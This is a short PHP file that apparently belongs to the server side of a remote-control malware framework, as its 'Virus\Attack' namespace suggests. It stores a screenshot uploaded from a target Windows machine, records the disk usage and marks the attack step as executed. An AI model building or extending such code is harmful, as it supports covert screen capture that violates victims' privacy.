<?php

/** @var \Kelvinho\Virus\Attack\Packages\Windows\OneTime\Screenshot\Screenshot $this */

$this->requestData->moveFile("screenshot", $this->getScreenPath());
$this->usage()->setDisk(filesize($this->getScreenPath()))->saveState();
$this->setExecuted();
